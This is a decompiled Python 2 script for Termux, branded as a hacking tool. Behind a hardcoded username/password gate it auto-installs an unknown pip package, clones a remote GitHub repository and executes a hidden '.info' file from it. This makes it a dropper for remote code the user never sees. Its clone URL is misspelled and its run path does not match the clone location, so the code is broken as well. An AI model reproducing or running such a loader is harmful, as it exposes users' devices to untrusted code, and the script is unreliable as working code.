# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
# -*- coding: utf-8 -*-
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests,bhottool
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system("pip2 install bhottool")
    time.sleep(1)
    os.system('python2 bhot.py')
reload(sys)
sys.setdefaultencoding('utf8')
os.system("clear")


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
		
		

##### LOGO #####
logo="""
\033[1;96m ------------------------
\033[1;92m  HACKER SULTAN SHARIAR 
 \033[1;96m ------------------------
\033[1;91m ____  _   _ _   _____  _    _   _     
\033[1;92m/ ___|| | | | | |_   _|/ \  | \ | |   
\033[1;91m\___ \| | | | |   | | / _ \ |  \| |   
\033[1;92m ___) | |_| | |___| |/ ___ \| |\  |
\033[1;91m|____/ \___/|_____|_/_/   \_\_| \_|
           \033[1;93m
            \033[1;92m
            \033[1;91m
          \033[1;92m 
           \033[1;91m                                             
\033[1;93m        
\033[1;97m--------------------------------------------------
\033[1;95m
 AUTHOR     : SULTAN SHARIAR
 TELEGRAM   : TERMUX COMMANDS
 HACKED     : BY SHARIAR (RASOOLI)
 GITHUB     : GITHUB.COM/Shazada-shariar
\033[1;32m
--------------------------------------------------
                                """
jalan("\033[1;93mCareted by Sultan Shariar")
jalan("\033[1;92mPlese join our telegram...")
time.sleep(1)

cusr = "sultan"
cpwd = "shariar"
def u():
    os.system("clear")
    print(logo)
    usr=raw_input(" Username : ")
    if usr == cusr:
        p()
    else:
        os.system("clear")
        print(logo)
        print(" Username : "+usr+" (wrong)")
        time.sleep(1)
        os.system('xdg-open https://t.me/httpTremaxcommands')
        u()
def p():
    os.system("clear")
    print(logo)
    print(" Username : sultan (correct)")
    pwd=raw_input("  Password : ")
    if pwd == cpwd:
        z()
    else:
        os.system("clear")
        print(logo)
        print(" Username : sultan (correct)")
        print(" Password : "+pwd+" (wrong)")
        time.sleep(1)
        p()
    
def z():
    os.system("clear")  
    print(logo)
    print(" Username : sultan (correct)")
    print(" password : shariar (correct)")
    print(" \033[1;92mLogin Successfull\033[0m")
    jalan("\033[1;91mPlease Wait...")
    os.system("clear")
    time.sleep(1)
    os.system("git clone htps://github.com/rasooli300/hck")
    
    os.system("python /data/data/com.termux/files/home/Gh/hck/.info")
if __name__=="__main__":
    u()

